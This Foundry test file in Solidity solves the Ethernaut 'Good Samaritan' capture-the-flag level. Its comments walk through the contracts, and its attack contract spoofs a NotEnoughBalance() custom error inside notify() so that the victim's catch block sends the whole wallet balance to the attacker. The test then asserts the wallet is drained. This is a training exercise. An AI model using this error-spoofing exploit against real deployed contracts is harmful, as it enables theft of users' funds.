// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GoodSamaritan/GoodSamaritanFactory.sol";
import "../src/Ethernaut.sol";

contract GoodSamaritanTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testGoodSamaritanHack() public {
        /****************
         * Factory setup *
         *************** */
        GoodSamaritanFactory goodSamaritanFactory = new GoodSamaritanFactory();
        ethernaut.registerLevel(goodSamaritanFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(
            goodSamaritanFactory
        );
        GoodSamaritan ethernautGoodSamaritan = GoodSamaritan(
            payable(levelAddress)
        );
        /****************
         *    Attack     *
         *************** */
        /*
         * Let's deconstruct the contracts
         *  ** Coin **
         * 1) Constructor: on initialization we need to pass an address that receives 1_000_000 coins
         * This also updates a mappings of address => uint256
         *
         * 2) Transfer:
         * This function receive a _dest and _amount
         * There is a condition checking if the amount is <= the current balance of the msg.sender;
         * There is also a check if the address is a contract and notifies the amount
         *
         * If the first condition is not met, it reverts with a custom error.
         *
         *
         *  ** Wallet **
         * 1) Constructor the owner of the wallet is msg.sender on construction
         * 2) it's linked to coin contract
         * 3) There is a modifier onlyOwner() checking if the "user" of the wallet is the owner or not
         * 4) donate10 function [onlyOwner]
         *   Basically check if the coin balance is < 10 -> reverts with custom error
         *   If > 10, transfer 10 to dest_
         * 5) transferRemainder [onlyOwner]
         *   transfer to dest_ the balance of coin, no real check on the target address,
         *   but callable only from owner
         *   Seems to be a good breach.
         * 6) setSoin [onlyOwner]
         *   sets a new coin contract address but only callable from owner.
         *
         *  ** GoodSamaritan **
         * 1) constructor:
         *   Create a new wallet ( and therefore is the owner );
         *   Create a new Coin with Wallet address ( so balance is 1_000_000)
         *   setCoin to coin.
         *
         * 2) requestDonation.
         *  So that function is interesting. By default, it will try to donate 10 coin to the msg.sender
         *  If it's going through, that ends here.
         *  If not, we catch the error, and there is a check
         *  "keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)"
         *  The key here is to know that Solidity doesn't support direct comparison of two strings but can be hashed to compare their values.
         *  If we manage to go in this catch block and trick this comparison, the wallet will transfer the remainder to msg.sender.
         *  And therefore we would have drained the wallet and revert NotEnoughBalance();
         *
         */
        Wallet samaritanWallet = Wallet(
            address(ethernautGoodSamaritan.wallet())
        );
        Coin samaritanCoin = Coin(address(ethernautGoodSamaritan.coin()));
        uint256 initialBalance = samaritanCoin.balances(
            address(samaritanWallet)
        );

        assertEq(initialBalance, 1_000_000);
        GoodSamaritanHack goodSamaritanHack = new GoodSamaritanHack(
            levelAddress
        );
        goodSamaritanHack.attack();
        uint256 afterAttackBalance = samaritanCoin.balances(
            address(samaritanWallet)
        );
        assertEq(afterAttackBalance, 0);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

/*
 * Here is the walkthrough:
 * 1) We instantiate the Hack contract to access the challenge
 * 2) Call the attack function to trigger requestDonation
 *     -> behind the scene, the function calls wallet.donate10(msg.sender) in try / catch block
 *     -> as balance is 1_000_000, it calls transfer
 *     -> transfer
 *        Here, the currentBalance is still 1_000_000 and amount_ is 10
 *        so the balances will get updated as following:
 *        balances[msg.sender] -= amount_;
 *        balances[dest_] += amount_;
 * NB: isContract is coming from Address library from OpenZeppelin
 *     -> notify will be called from our contract with the amount_ == 1_000_000
 *  with INotifyable(dest_).notify(amount_);
 *  3) function as amount  will revert and go into the catch block we wanted to react
 * Behind the scene, the function will be called 2 times with amount 10 and then 1_000_000
 *
 * Here is the flow behind the scene:
 * request a first donation
 * call donate10
 * balance is : 1000000
 * calling coin.transfer for amount for 10
 * calling transfer
 * current balance is : 1000000
 * calling notify with amount: 10 ( but we have in our hack contract a revert if amount ≥ 10 )
 * in the catch block, as error comparison failed
 * calling transfer remainder to msg.sender with total balance
 * calling transfer
 * current balance is : 1000000
 * calling notify with amount: 1000000
 *
 */

contract GoodSamaritanHack {
    error NotEnoughBalance();
    GoodSamaritan challenge;

    // -- 1 --
    constructor(address _victim) {
        challenge = GoodSamaritan(_victim);
    }

    // -- 2 --
    function attack() external {
        challenge.requestDonation();
    }

    // -- 3 --
    // overwrite notify function to trigger NotEnoughBalance
    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            // -- 4 --
            revert NotEnoughBalance();
        }
    }
}
